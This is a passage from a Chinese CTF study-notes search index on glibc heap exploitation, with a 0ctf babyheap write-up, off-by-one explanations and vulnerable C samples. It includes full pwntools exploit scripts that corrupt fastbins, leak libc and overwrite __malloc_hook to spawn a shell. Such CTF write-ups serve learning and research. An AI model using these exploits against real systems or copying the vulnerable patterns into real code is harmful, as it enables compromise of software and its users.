'system' ] str_binsh = libc_base + libc . search ( '/bin/sh' ) . next () malloc_hook = libc_base + libc . sym [ '__malloc_hook' ] log . info ( 'libc_base:' + hex ( libc_base )) log . info ( \"system:\" + hex ( system )) log . info ( \"str_binsh:\" + hex ( str_binsh )) log . info ( \"malloc_hook:\" + hex ( malloc_hook )) p . sendline ( 'n' ) Index ( ' s ' . rjust ( 0x68 , 'a' )) Index ( ' k ' . rjust ( 0x68 , 'a' )) Index ( ' y ' . rjust ( 0x68 , 'a' )) search ( 's' ) p . recvuntil ( \"Found\" ) p . sendline ( 'y' ) search ( 'k' ) p . recvuntil ( \"Found\" ) p . sendline ( 'y' ) search ( 'y' ) p . recvuntil ( \"Found\" ) p . sendline ( 'y' ) search ( ' \\x00 ' ) p . recvuntil ( \"Found\" ) p . sendline ( 'n' ) p . recvuntil ( \"Found\" ) p . sendline ( 'y' ) fakechunk_addr = malloc_hook - 0x23 Index ( p64 ( fakechunk_addr ) . ljust ( 0x68 , 'b' )) Index ( ' s ' . rjust ( 0x68 , 'b' )) Index ( ' k ' . rjust ( 0x68 , 'b' )) ''' 0x45226 execve(\"/bin/sh\", rsp+0x30, environ) constraints: rax == NULL 0x4527a execve(\"/bin/sh\", rsp+0x30, environ) constraints: [rsp+0x30] == NULL 0xf0364 execve(\"/bin/sh\", rsp+0x50, environ) constraints: [rsp+0x50] == NULL 0xf1207 execve(\"/bin/sh\", rsp+0x70, environ) constraints: [rsp+0x70] == NULL ''' # gdb.attach(p) Index ( p64 ( 0xf1207 + libc_base ) . rjust ( 0x1b , 'a' ) . ljust ( 0x68 , 'b' )) # gdb.attach(p) p . interactive () if __name__ == '__main__' : exp ()","title":"EXP"},{"location":"Pwn/glibc-heap/fastbin/#2017-0ctf-babyheap","text":"","title":"2017 0ctf babyheap"},{"location":"Pwn/glibc-heap/fastbin/#_23","text":"1 2 3 4 5 Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled \u4fdd\u62a4\u5168\u5f00\uff0cRELRO \u5168\u5f00\uff0cgot \u8868\u4e0d\u80fd\u4fee\u6539\u3002","title":"\u57fa\u672c\u60c5\u51b5"},{"location":"Pwn/glibc-heap/fastbin/#_24","text":"\u7a0b\u5e8f\u662f\u4e00\u4e2a\u5806\u7ba1\u7406\u5668\uff0c\u6709\u589e\u5220\u67e5\u6539\u529f\u80fd\u3002 \u7ed3\u6784\u4f53\uff1a struct { int inuse ; int size ; void * chunk_ptr ; } \u9650\u5236\u7533\u8bf7 chunk \u4e0a\u9650\u4e3a 16 \u4e2a\uff0c\u5927\u5c0f\u5c0f\u4e8e\u7b49\u4e8e 4096 \u5b57\u8282\u5373\u53ef\u3002\u56db\u5927\u529f\u80fd\u90fd\u662f\u6839\u636e chunk \u4e0b\u6807\u8fdb\u884c\u64cd\u4f5c\u3002","title":"\u57fa\u672c\u529f\u80fd"},{"location":"Pwn/glibc-heap/fastbin/#_25","text":"\u5728\u4fee\u6539\u51fd\u6570\u4e2d\uff0c\u4fee\u6539\u7684\u5927\u5c0f\u662f\u81ea\u884c\u8f93\u5165\u7684\uff0c\u5e76\u4e0d\u662f\u8bfb\u53d6\u7ed3\u6784\u4f53\u4e2d chunk size \uff0c\u9020\u6210\u4e86\u5806\u6ea2\u51fa\u95ee\u9898\u3002 __int64 __fastcall my_write ( __int64 a1 ) { __int64 index ; // rax int i ; // [rsp+18h] [rbp-8h] int size ; // [rsp+1Ch] [rbp-4h] printf ( \"Index: \" ); index = get_num (); i = index ; if ( ( signed int ) index >= 0 && ( signed int ) index <= 15 ) // \u68c0\u67e5\u4e0b\u6807\u8303\u56f4 { index = * ( unsigned int * )( 24L L * ( signed int ) index + a1 ); // \u63d0\u53d6chunk\u6307\u9488 if ( ( _DWORD ) index == 1 ) // \u68c0\u67e5inuse\u4f4d { printf ( \"Size: \" ); index = get_num (); size = index ; if ( ( signed int ) index > 0 ) // \u68c0\u67e5size\u5927\u4e8e0 { printf ( \"Content: \" ); index = write_chunk ( * ( _QWORD * )( 24L L * i + a1 + 16 ), size ); // \u5806\u6ea2\u51fa\uff0c\u6ca1\u6709\u5bf9size\u8fdb\u884c\u68c0\u67e5 } } } return index ; }","title":"\u6f0f\u6d1e"},{"location":"Pwn/glibc-heap/fastbin/#_26","text":"\u5229\u7528\u5806\u6ea2\u51fa\uff0c\u9020\u6210\u5806\u91cd\u53e0\uff08\u901a\u8fc7 extend \u5411\u524d\u5408\u5e76\uff09\uff0c\u6cc4\u9732\u51fa libc \u5730\u5740\u3002\u518d\u6b21\u5229\u7528\u5806\u6ea2\u51fa\uff0c\u9020\u6210 fastbin attack\uff08Arbitray Alloc\uff09\uff0c\u4fee\u6539 __malloc_hook \u4e3a onegadget \u3002 \u521b\u5efa\u975e fastbin \u7684 chunk0\u30012 \u89e6\u53d1 unlink \u5408\u5e76\u4e3a\u4e00\u4e2a\u6574\u4f53\uff1b\u88ab\u91cd\u53e0 chunk1 \u7528\u4e8e\u8bfb\u53d6 libc \u5730\u5740\uff1b\u4fdd\u62a4\u907f\u514d\u4e0e topchunk \u5408\u5e76\u7684 chunk3 \u3002 \u91ca\u653e chunk0 \uff0c\u4fee\u6539 chunk1 \u6ea2\u51fa\u8986\u76d6 chunk2 \u7684 prev_size \u548c size_inuse \uff0c\u91ca\u653e chunk2 \u89e6\u53d1 unlink \u5408\u5e76\u3002 create ( 0x80 ) #0 create ( 0x10 ) #1 create ( 0x80 ) #2 create ( 0x10 ) #3 free ( 0 ) payload = 'a' * 0x10 + p64 ( 0xb0 ) + p64 ( 0x90 ) write ( 1 , len ( payload ), payload ) free ( 2 ) create ( 0x80 ) dump ( 1 ) p . recvuntil ( \"Content: \\n \" ) leak_addr = u64 ( p . recv ( 6 ) . ljust ( 8 , ' \\x00 ' )) log . info ( \"leak_addr:\" + hex ( leak_addr )) \u7533\u8bf7 0x60 fastbin chunk \u4e4b\u540e\u5c31\u662f\u5e38\u89c4\u7684\u4fee\u6539 fastbin fd \u6307\u9488\u8fbe\u5230\u4efb\u610f\u5199\u7684\u64cd\u4f5c\u3002\u8fd9\u91cc\u504f\u79fb\u6784\u9020 size \u4f4d\u6211\u9009\u62e9 0x23 \u3002 create ( 0x10 ) #3 create ( 0x70 ) #4 create ( 0x60 ) #5 free ( 5 ) payload = 'c' * 0xa0 + p64 ( 0 ) + p64 ( 0x71 ) payload += p64 ( malloc_hook - 0x23 ) # write(3,len(payload),payload) write ( 4 , len ( payload ), payload ) create ( 0x60 ) #5 create ( 0x60 ) #6 payload = 'a' * ( 0x23 - 0x10 ) payload += p64 ( onegadget ) write ( 6 , len ( payload ), payload ) creat ( 0x20 )","title":"\u601d\u8def"},{"location":"Pwn/glibc-heap/fastbin/#unsortedbin-fastbin","text":"\u8fd9\u662f\u53e6\u5916\u4e00\u4e2a\u601d\u8def\u6cc4\u9732\u51fa libc \u5730\u5740\uff0c\u524d\u9762\u662f\u7528 unlink \u673a\u5236\u5b9e\u73b0\u7684\u4e00\u4e2a\u5806\u91cd\u53e0\u3002\u8fd9\u91cc\u7528 wiki \u7684\u65b9\u6cd5\uff0c\u901a\u8fc7\u4fee\u6539 fastbin fd \u6307\u9488\uff0c\u914d\u5408\u4fee\u6539 chunk header \u4fe1\u606f\uff0c\u5c06\u4e00\u4e2a inuse \u7684 unsorted bin \u653e\u5165\u5230 fastbin \uff0c\u91cd\u65b0\u7533\u8bf7\u51fa\u6765\uff0c\u5b9e\u73b0\u4e24\u4e2a\u6307\u9488\u6307\u5411\u4e00\u4e2a\u5730\u5740\u3002 \u5e03\u7f6e\u597d\u5806\u60c5\u51b5\uff1a create ( 0x10 ) #\u6ea2\u51fa\u4fee\u6539\u4e0b\u4e00\u4e2achunk header create ( 0x10 ) #fastbin create ( 0x10 ) #fastbin create ( 0x10 ) #\u6ea2\u51fa\u4fee\u6539\u4e0b\u4e00\u4e2achunk header create ( 0x80 ) #\u88ab\u653e\u5165fastbin\u7684chunk create ( 0x100 ) #\u9632\u6b62unsortedbin\u4e0etopchunk\u5408\u5e76 #\u5e03\u7f6efastbin #chunk1->chunk2->0 free ( 2 ) free ( 1 ) \u7136\u540e\u4fee\u6539 fastbin fd \u6307\u9488\u6307\u5411 unsorted bin #fastbin:chunk1->chunk4->0 payload = 'a' * 0x10 payload += p64 ( 0 ) + p64 ( 0x21 ) payload += ' \\x80 ' write ( 0 , len ( payload ), payload ) \u7136\u540e\u5c06 unsorted bin \u7684 chunk size \u4fee\u6539\u4e3a\u6240\u5728\u7684 fastbin \u5927\u5c0f\uff0c\u4ece\u800c\u7ed5\u8fc7 fastbin \u7533\u8bf7\u65f6\u7684\u68c0\u67e5\uff1a payload = 'a' * 0x10 payload += p64 ( 0 ) + p64 ( 0x21 ) write ( 3 , len ( payload ), payload ) fastbin \u7533\u8bf7\u68c0\u67e5\u6e90\u7801\uff1a if ( __builtin_expect ( fastbin_index ( chunksize ( victim )) != idx , 0 )) { errstr = \"malloc(): memory corruption (fast)\" ; errout : malloc_printerr ( check_action , errstr , chunk2mem ( victim ), av ); return NULL ; } \u7533\u8bf7\u4e24\u6b21 fastbin \uff0c\u5c06 unsorted bin \u7533\u8bf7\u51fa\u6765\u3002\u7136\u540e\u9700\u8981\u5c06 unsorted bin \u7684 chunk_size \u4fee\u6539\u4e3a\u6b63\u786e\u5927\u5c0f\uff0c\u624d\u80fd\u6210\u529f\u91ca\u653e\uff1a create ( 0x10 ) create ( 0x10 ) #\u4fee\u590dchunk_size payload = 'a' * 0x10 payload += p64 ( 0 ) + p64 ( 0x91 ) write ( 3 , len ( payload ), payload ) free ( 4 ) dump ( 2 )","title":"\u4f2a\u9020 unsortedbin \u4e3a fastbin"},{"location":"Pwn/glibc-heap/fastbin/#exp_2","text":"from pwn import * context ( log_level = 'debug' , os = 'linux' , arch = 'amd64' ) p = process ( \"./babyheap\" ) elf = ELF ( \"./babyheap\" ) libc = ELF ( \"/lib/x86_64-linux-gnu/libc.so.6\" ) def create ( size ): p . recvuntil ( \"Command: \" ) p . sendline ( '1' ) p . recvuntil ( \"Size: \" ) p . sendline ( str ( size )) def write ( index , size , content ): p . recvuntil ( \"Command: \" ) p . sendline ( '2' ) p . recvuntil ( \"Index: \" ) p . sendline ( str ( index )) p . recvuntil ( \"Size: \" ) p . sendline ( str ( size )) p . recvuntil ( \"Content: \" ) p . send ( content ) def free ( index ): p . recvuntil ( \"Command: \" ) p . sendline ( '3' ) p . recvuntil ( \"Index: \" ) p . sendline ( str ( index )) def dump ( index ): p . recvuntil ( \"Command: \" ) p . sendline ( \"4\" ) p . recvuntil ( \"Index: \" ) p . sendline ( str ( index )) # ex create ( 0x80 ) #0 create ( 0x10 ) #1 create ( 0x80 ) #2 create ( 0x10 ) #3 free ( 0 ) payload = 'a' * 0x10 + p64 ( 0xb0 ) + p64 ( 0x90 ) write ( 1 , len ( payload ), payload ) free ( 2 ) create ( 0x80 ) dump ( 1 ) p . recvuntil ( \"Content: \\n \" ) leak_addr = u64 ( p . recv ( 6 ) . ljust ( 8 , ' \\x00 ' )) log . info ( \"leak_addr:\" + hex ( leak_addr )) libc_base = leak_addr - 0x3c4b78 malloc_hook = libc_base + libc . sym [ '__malloc_hook' ] one = [ 0x45226 , 0x4527a , 0xf0364 , 0xf1207 ] onegadget = one [ 1 ] + libc_base log . info ( \"libc_base:\" + hex ( libc_base )) log . info ( \"malloc_hook:\" + hex ( malloc_hook )) log . info ( \"onegadget:\" + hex ( onegadget )) create ( 0x10 ) #3 create ( 0x70 ) #4 create ( 0x60 ) #5 free ( 5 ) payload = 'c' * 0xa0 + p64 ( 0 ) + p64 ( 0x71 ) payload += p64 ( malloc_hook - 0x23 ) # write(3,len(payload),payload) write ( 4 , len ( payload ), payload ) create ( 0x60 ) #5 create ( 0x60 ) #6 payload = 'a' * ( 0x23 - 0x10 ) payload += p64 ( onegadget ) write ( 6 , len ( payload ), payload ) create ( 0x20 ) # gdb.attach(p,\"b *$rebase (0x119F)\") p . interactive ()","title":"EXP"},{"location":"Pwn/glibc-heap/off_by_one/","text":"\u5806\u4e2d\u7684 Off-By-One \u00b6 \u7edd\u5927\u90e8\u5206\u5185\u5bb9\u6765\u81ea CTF-WIKI \uff0c\u5185\u5bb9\u5f15\u7528\u7528\u4e8e\u5b66\u4e60\u8bb0\u5f55 \u4ecb\u7ecd \u00b6 \u4e25\u683c\u6765\u8bf4 off-by-one \u6f0f\u6d1e\u662f\u4e00\u79cd\u7279\u6b8a\u7684\u6ea2\u51fa\u6f0f\u6d1e\uff0coff-by-one \u6307\u7a0b\u5e8f\u5411\u7f13\u51b2\u533a\u4e2d\u5199\u5165\u65f6\uff0c\u5199\u5165\u7684\u5b57\u8282\u6570\u8d85\u8fc7\u4e86\u8fd9\u4e2a\u7f13\u51b2\u533a\u672c\u8eab\u6240\u7533\u8bf7\u7684\u5b57\u8282\u6570\u5e76\u4e14\u53ea\u8d8a\u754c\u4e86\u4e00\u4e2a\u5b57\u8282\u3002 off-by-one \u6f0f\u6d1e\u539f\u7406 \u00b6 off-by-one \u662f\u6307\u5355\u5b57\u8282\u7f13\u51b2\u533a\u6ea2\u51fa\uff0c\u8fd9\u79cd\u6f0f\u6d1e\u7684\u4ea7\u751f\u5f80\u5f80\u4e0e\u8fb9\u754c\u9a8c\u8bc1\u4e0d\u4e25\u548c\u5b57\u7b26\u4e32\u64cd\u4f5c\u6709\u5173\uff0c\u5f53\u7136\u4e5f\u4e0d\u6392\u9664\u5199\u5165\u7684 size \u6b63\u597d\u5c31\u53ea\u591a\u4e86\u4e00\u4e2a\u5b57\u8282\u7684\u60c5\u51b5\u3002\u5176\u4e2d\u8fb9\u754c\u9a8c\u8bc1\u4e0d\u4e25\u901a\u5e38\u5305\u62ec \u4f7f\u7528\u5faa\u73af\u8bed\u53e5\u5411\u5806\u5757\u4e2d\u5199\u5165\u6570\u636e\u65f6\uff0c\u5faa\u73af\u7684\u6b21\u6570\u8bbe\u7f6e\u9519\u8bef\uff08\u8fd9\u5728 C \u8bed\u8a00\u521d\u5b66\u8005\u4e2d\u5f88\u5e38\u89c1\uff09\u5bfc\u81f4\u591a\u5199\u5165\u4e86\u4e00\u4e2a\u5b57\u8282\u3002 \u5b57\u7b26\u4e32\u64cd\u4f5c\u4e0d\u5408\u9002 \u4e00\u822c\u6765\u8bf4\uff0c\u5355\u5b57\u8282\u6ea2\u51fa\u88ab\u8ba4\u4e3a\u662f\u96be\u4ee5\u5229\u7528\u7684\uff0c\u4f46\u662f\u56e0\u4e3a Linux \u7684\u5806\u7ba1\u7406\u673a\u5236 ptmalloc \u9a8c\u8bc1\u7684\u677e\u6563\u6027\uff0c\u57fa\u4e8e Linux \u5806\u7684 off-by-one \u6f0f\u6d1e\u5229\u7528\u8d77\u6765\u5e76\u4e0d\u590d\u6742\uff0c\u5e76\u4e14\u5a01\u529b\u5f3a\u5927\u3002 \u6b64\u5916\uff0c\u9700\u8981\u8bf4\u660e\u7684\u4e00\u70b9\u662f off-by-one \u662f\u53ef\u4ee5\u57fa\u4e8e\u5404\u79cd\u7f13\u51b2\u533a\u7684\uff0c\u6bd4\u5982\u6808 1 \u3001bss \u6bb5\u7b49\u7b49\uff0c\u4f46\u662f\u5806\u4e0a\uff08heap based\uff09 \u7684 off-by-one \u662f CTF \u4e2d\u6bd4\u8f83\u5e38\u89c1\u7684\u3002\u6211\u4eec\u8fd9\u91cc\u4ec5\u8ba8\u8bba\u5806\u4e0a\u7684 off-by-one \u60c5\u51b5\u3002 off-by-one \u5229\u7528\u601d\u8def \u00b6 \u6ea2\u51fa\u5b57\u8282\u4e3a\u53ef\u63a7\u5236\u4efb\u610f\u5b57\u8282 \uff1a\u901a\u8fc7\u4fee\u6539\u5927\u5c0f\u9020\u6210\u5757\u7ed3\u6784\u4e4b\u95f4\u51fa\u73b0\u91cd\u53e0\uff0c\u4ece\u800c\u6cc4\u9732\u5176\u4ed6\u5757\u6570\u636e\uff0c\u6216\u662f\u8986\u76d6\u5176\u4ed6\u5757\u6570\u636e\u3002 \u4e5f\u53ef\u4f7f\u7528 NULL \u5b57\u8282\u6ea2\u51fa\u7684\u65b9\u6cd5 \u6ea2\u51fa\u5b57\u8282\u4e3a NULL \u5b57\u8282 \uff1a\u5728 size \u4e3a 0x100 \u7684\u65f6\u5019\uff0c\u6ea2\u51fa NULL \u5b57\u8282\u53ef\u4ee5\u4f7f\u5f97 prev_in_use \u4f4d\u88ab\u6e05\uff0c\u8fd9\u6837\u524d\u5757\u4f1a\u88ab\u8ba4\u4e3a\u662f free \u5757 2 \u3002 \u8fd9\u65f6\u53ef\u4ee5\u9009\u62e9\u4f7f\u7528 unlink \u65b9\u6cd5\uff08\u89c1 unlink \u90e8\u5206\uff09\u8fdb\u884c\u5904\u7406\u3002 \u53e6\u5916\uff0c\u8fd9\u65f6 prev_inuse \u57df\u5c31\u4f1a\u542f\u7528\uff0c\u5c31\u53ef\u4ee5\u4f2a\u9020 prev_inuse \uff0c\u4ece\u800c\u9020\u6210\u5757\u4e4b\u95f4\u53d1\u751f\u91cd\u53e0\u3002\u6b64\u65b9\u6cd5\u7684\u5173\u952e\u5728\u4e8e unlink \u7684\u65f6\u5019\u6ca1\u6709\u68c0\u67e5\u6309\u7167 prev_inuse \u627e\u5230\u7684\u5757\u7684\u5927\u5c0f\u4e0e prev_inuse \u662f\u5426\u4e00\u81f4\uff08libc 2.28 \u4e4b\u524d\uff09\u3002 \u6700\u65b0\u7248\u672c\u4ee3\u7801\u4e2d\uff0c\u5df2\u52a0\u5165\u9488\u5bf9 2 \u4e2d\u540e\u4e00\u79cd\u65b9\u6cd5\u7684 check \uff0c\u4f46\u662f\u5728 2.28 \u524d\u5e76\u6ca1\u6709\u8be5 check \u3002 /* consolidate backward */ if ( ! prev_inuse ( p )) { prevsize = prev_inuse ( p ); size += prevsize ; p = chunk_at_offset ( p , - (( long ) prevsize )); /* \u540e\u4e24\u884c\u4ee3\u7801\u5728\u6700\u65b0\u7248\u672c\u4e2d\u52a0\u5165\uff0c\u5219 2 \u7684\u7b2c\u4e8c\u79cd\u65b9\u6cd5\u65e0\u6cd5\u4f7f\u7528\uff0c\u4f46\u662f 2.28 \u53ca\u4e4b\u524d\u90fd\u6ca1\u6709\u95ee\u9898 */ if ( __glibc_unlikely ( chunksize ( p ) != prevsize )) malloc_printerr ( \"corrupted size vs. prev_inuse while consolidating\" ); unlink_chunk ( av , p ); } \u793a\u4f8b 1 \u00b6 int my_gets ( char * ptr , int size ) { int i ; //\u8fd9\u91cc\u5199\u6210\u5c0f\u4e8e\u7b49\u4e8e\u5bfc\u81f4\u53ef\u4ee5\u591a\u5199\u5165\u4e00\u4e2a\u5b57\u8282 for ( i = 0 ; i <= size ; i ++ ) { ptr [ i ] = getchar (); } return i ; } int main () { void * chunk1 , * chunk2 ; chunk1 = malloc ( 16 ); chunk2 = malloc ( 16 ); puts ( \"Get Input:\" ); my_gets ( chunk1 , 16 ); return 0 ; } \u6211\u4eec\u81ea\u5df1\u7f16\u5199\u7684 my_gets \u51fd\u6570\u5bfc\u81f4\u4e86\u4e00\u4e2a off-by-one \u6f0f\u6d1e\uff0c\u539f\u56e0\u662f for \u5faa\u73af\u7684\u8fb9\u754c\u6ca1\u6709\u63a7\u5236\u597d\u5bfc\u81f4\u5199\u5165\u591a\u6267\u884c\u4e86\u4e00\u6b21\uff0c\u8fd9\u4e5f\u88ab\u79f0\u4e3a\u6805\u680f\u9519\u8bef wikipedia: \u6805\u680f\u9519\u8bef\uff08\u6709\u65f6\u4e5f\u79f0\u4e3a\u7535\u7ebf\u6746\u9519\u8bef\u6216\u8005\u706f\u67f1\u9519\u8bef\uff09\u662f\u5dee\u4e00\u9519\u8bef\u7684\u4e00\u79cd\u3002\u5982\u4ee5\u4e0b\u95ee\u9898\uff1a \u5efa\u9020\u4e00\u6761\u76f4\u6805\u680f\uff08\u5373\u4e0d\u56f4\u5708\uff09\uff0c\u957f 30 \u7c73\u3001\u6bcf\u6761\u6805\u680f\u67f1\u95f4\u76f8\u9694 3 \u7c73\uff0c\u9700\u8981\u591a\u5c11\u6761\u6805\u680f\u67f1\uff1f \u6700\u5bb9\u6613\u60f3\u5230\u7684\u7b54\u6848 10 \u662f\u9519\u7684\u3002\u8fd9\u4e2a\u6805\u680f\u6709 10 \u4e2a\u95f4\u9694\uff0c11 \u6761\u6805\u680f\u67f1\u3002 \u6211\u4eec\u4f7f\u7528 gdb \u5bf9\u7a0b\u5e8f\u8fdb\u884c\u8c03\u8bd5\uff0c\u5728\u8fdb\u884c\u8f93\u5165\u524d\u53ef\u4ee5\u770b\u5230\u5206\u914d\u7684\u4e24\u4e2a\u7528\u6237\u533a\u57df\u4e3a 16 \u5b57\u8282\u7684\u5806\u5757 0x602000: 0x0000000000000000 0x0000000000000021 < === chunk1 0x602010: 0x0000000000000000 0x0000000000000000 0x602020: 0x0000000000000000 0x0000000000000021 < === chunk2 0x602030: 0x0000000000000000 0x0000000000000000 \u5f53\u6211\u4eec\u6267\u884c my_gets \u8fdb\u884c\u8f93\u5165\u4e4b\u540e\uff0c\u53ef\u4ee5\u770b\u5230\u6570\u636e\u53d1\u751f\u4e86\u6ea2\u51fa\u8986\u76d6\u5230\u4e86\u4e0b\u4e00\u4e2a\u5806\u5757\u7684 prev_inuse \u57df print 'A'*17 0x602000: 0x0000000000000000 0x0000000000000021 < === chunk1 0x602010: 0x4141414141414141 0x4141414141414141 0x602020: 0x0000000000000041 0x0000000000000021 < === chunk2 0x602030: 0x0000000000000000 0x0000000000000000 \u793a\u4f8b 2 \u00b6 \u7b2c\u4e8c\u79cd\u5e38\u89c1\u7684\u5bfc\u81f4 off-by-one \u7684\u573a\u666f\u5c31\u662f\u5b57\u7b26\u4e32\u64cd\u4f5c\u4e86\uff0c\u5e38\u89c1\u7684\u539f\u56e0\u662f\u5b57\u7b26\u4e32\u7684\u7ed3\u675f\u7b26\u8ba1\u7b97\u6709\u8bef int main(void) { char buffer[40]=\"\"; void *chunk1; chunk1=malloc(24); puts(\"Get Input\"); gets(buffer); if(strlen(buffer)==24) { strcpy(chunk1,buffer); } return 0; } \u7a0b\u5e8f\u4e4d\u770b\u4e0a\u53bb\u6ca1\u6709\u4efb\u4f55\u95ee\u9898\uff08\u4e0d\u8003\u8651\u6808\u6ea2\u51fa\uff09\uff0c\u53ef\u80fd\u5f88\u591a\u4eba\u5728\u5b9e\u9645\u7684\u4ee3\u7801\u4e2d\u4e5f\u662f\u8fd9\u6837\u5199\u7684\u3002 \u4f46\u662f strlen \u548c strcpy \u7684\u884c\u4e3a\u4e0d\u4e00\u81f4\u5374\u5bfc\u81f4\u4e86 off-by-one \u7684\u53d1\u751f\u3002 strlen \u662f\u6211\u4eec\u5f88\u719f\u6089\u7684\u8ba1\u7b97 ascii \u5b57\u7b26\u4e32\u957f\u5ea6\u7684\u51fd\u6570\uff0c strlen \u5728\u8ba1\u7b97\u5b57\u7b26\u4e32\u957f\u5ea6\u65f6\u662f\u4e0d\u628a\u7ed3\u675f\u7b26 \\x00 \u8ba1\u7b97\u5728\u5185\u7684\uff0c\u4f46\u662f strcpy \u5728\u590d\u5236\u5b57\u7b26\u4e32\u65f6\u4f1a\u62f7\u8d1d\u7ed3\u675f\u7b26 \\x00 \u3002\u8fd9\u5c31\u5bfc\u81f4\u4e86\u6211\u4eec\u5411 chunk1 \u4e2d\u5199\u5165\u4e86 25 \u4e2a\u5b57\u8282\uff0c\u6211\u4eec\u4f7f\u7528 gdb \u8fdb\u884c\u8c03\u8bd5\u53ef\u4ee5\u770b\u5230\u8fd9\u4e00\u70b9\u3002 0x602000: 0x0000000000000000 0x0000000000000021 <=== chunk1 0x602010: 0x0000000000000000 0x0000000000000000 0x602020: 0x0000000000000000 0x0000000000000411 <=== next chunk \u5728\u6211\u4eec\u8f93\u5165'A'*24 \u540e\u6267\u884c strcpy 0x602000: 0x0000000000000000 0x0000000000000021 0x602010: 0x4141414141414141 0x4141414141414141 0x602020: 0x4141414141414141 0x0000000000000400(11) \u53ef\u4ee5\u770b\u5230 next chunk \u7684 size \u57df\u4f4e\u5b57\u8282\u88ab\u7ed3\u675f\u7b26 '\\x00' \u8986\u76d6\uff0c\u8fd9\u79cd\u53c8\u5c5e\u4e8e off-by-one \u7684\u4e00\u4e2a\u5206\u652f\u79f0\u4e3a NULL byte off-by-one 3 \uff0c\u6211\u4eec\u5728\u540e\u9762\u4f1a\u770b\u5230 off-by-one \u4e0e NULL byte off-by-one \u5728\u5229\u7528\u4e0a\u7684\u533a\u522b\u3002 \u8fd8\u662f\u6709\u4e00\u70b9\u5c31\u662f\u4e3a\u4ec0\u4e48\u662f\u4f4e\u5b57\u8282\u88ab\u8986\u76d6\u5462\uff0c\u56e0\u4e3a\u6211\u4eec\u901a\u5e38\u4f7f\u7528\u7684 CPU \u7684\u5b57\u8282\u5e8f\u90fd\u662f\u5c0f\u7aef\u6cd5\u7684\uff0c\u6bd4\u5982\u4e00\u4e2a DWORD \u503c\u5728\u4f7f\u7528\u5c0f\u7aef\u6cd5\u7684\u5185\u5b58\u4e2d\u662f\u8fd9\u6837\u50a8\u5b58\u7684 DWORD 0x41424344 \u5185\u5b58 0x44,0x43,0x42,0x41 \u5b9e\u4f8b 1: Asis CTF 2016 b00ks \u00b6 WiKi\u4e0a\u6ca1\u6709\u660e\u786e\u8bf4\u660e\u9898\u76ee\u7684\u73af\u5883\uff0c\u591a\u65b9\u786e\u8ba4\u540e\uff1a\u5982\u679c\u4f7f\u7528\u4fee\u6539\u7ed3\u6784\u4f53\u6307\u9488\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u5199\uff0c\u73af\u5883\u5e94\u8be5\u662f ubuntu 18 ;\u5982\u679c\u4f7f\u7528 unlink \u4e5f\u5c31\u662f wiki \u4e2d\u7684\u7b80\u6d01\u65b9\u6848\uff0cubuntu16&18\u3002 \u4ee5\u4e0b wp \u5173\u4e8e\u4fee\u6539\u7ed3\u6784\u4f53\u6307\u9488\u65b9\u6cd5\u90fd\u66ff\u6362\u4e3a\u6211\u81ea\u5df1\u7684\u7248\u672c \u4fdd\u62a4\u60c5\u51b5 \u00b6 \u9898\u76ee\u662f 64 \u4f4d\u7a0b\u5e8f\uff0c\u4fdd\u62a4\u5982\u4e0b\u6240\u793a\u3002 Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled \u7a0b\u5e8f\u529f\u80fd \u00b6 \u9898\u76ee\u662f\u4e00\u4e2a\u5e38\u89c1\u7684\u9009\u5355\u5f0f\u7a0b\u5e8f\uff0c\u529f\u80fd\u662f\u4e00\u4e2a\u56fe\u4e66\u7ba1\u7406\u7cfb\u7edf\u3002\u7a0b\u5e8f\u63d0\u4f9b\u4e86\u521b\u5efa\u3001\u5220\u9664\u3001\u7f16\u8f91\u3001\u6253\u5370\u56fe\u4e66\u7684\u529f\u80fd\u3002 1 . Create a book 2 . Delete a book 3 . Edit a book 4 . Print book detail 5 . Change current author name 6 . Exit \u8fdb\u5165\u7a0b\u5e8f\u8981\u6c42\u8f93\u5165\u4e00\u4e2a author name \u957f\u5ea6\u8981\u6c42\u4e0d\u5927\u4e8e32\u3002 \u6bcf\u672c\u4e66\uff08chunk\uff09\u4fe1\u606f\u7528\u5927\u5c0f\u4e3a 0x20 \u7684 book \u7ed3\u6784\u4f53\u6765\u7ef4\u62a4\uff0c\u5176\u4e2d name \u548c description \u5728\u5806\u4e0a\u5206\u914d\uff0c\u7ed3\u6784\u4f53\u4e2d\u5b58\u50a8\u7684\u662f\u5730\u5740\u6307\u9488\u3002book_name\u3001book_description \u5927\u5c0f\u81ea\u5b9a\u4e14\u65e0\u9650\u5236\u5927\u5c0f\u3002 \u8be6\u7ec6\u7ed3\u6784\u4f53\u5982\u4e0b\uff1a\uff08\u4ece my_create \u51fd\u6570\u4e2d\u7ed3\u5c3e\u53ef\u63a8\u51fa\u7ed3\u6784\u4f53\uff0c\u4e0b\u9762\u662f\u7b80\u5316\u8fc7\u7684\uff09 struct book { int id ; //8bit char * book_name ; //8bit char * book_description ; //8bit int size ; //8bit } \u7ed3\u6784\u4f53\u7533\u8bf7\u597d\u540e\uff0c\u540c\u4e00\u653e\u7f6e\u5230 off_202010 \u5217\u8868\u4e2d\u7ba1\u7406\u3002 * (( _QWORD * ) off_202010 + v2 ) = book ; \u6f0f\u6d1e\u51fd\u6570 \u00b6 \u7a0b\u5e8f\u7f16\u5199\u5b9a\u4e49\u7684\u8bfb\u5165\u51fd\u6570 sub_9F5() \u5b58\u5728 null byte off-by-one \uff08\u540e\u6587\u79f0\u8be5\u51fd\u6570\u4e3a my_read() \uff09\u3002\u6765\u770b\u4e00\u4e0b\u8fd9\u4e2a\u51fd\u6570\u6e90\u7801\uff0c\u6ce8\u610f\u7559\u610f\u6700\u540e\u4e00\u6b21\u5faa\u73af\u7684\u8fb9\u754c\u8f93\u5165\u3002 signed __int64 __fastcall my_read ( _BYTE * a1 , int a2 ) { int i ; // [rsp+14h] [rbp-Ch] _BYTE * buf ; // [rsp+18h] [rbp-8h] if ( a2 <= 0 ) return 0L L ; buf = a1 ; for ( i = 0 ; ; ++ i ) { if ( ( unsigned int ) read ( 0 , buf , 1uLL ) != 1 ) return 1L L ; if ( * buf == 10 ) break ; ++ buf ; if ( i == a2 ) //\u6ca1\u6709\u6b63\u786e\u5904\u7406\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u5199\u5165\u4f4d\u7f6e break ; } * buf = 0 ; //\u6f0f\u6d1e\u70b9 return 0L L ; } \u5bf9\u6bd4\u4e00\u4e0b\u5176\u4ed6\u8c03\u7528 my_read 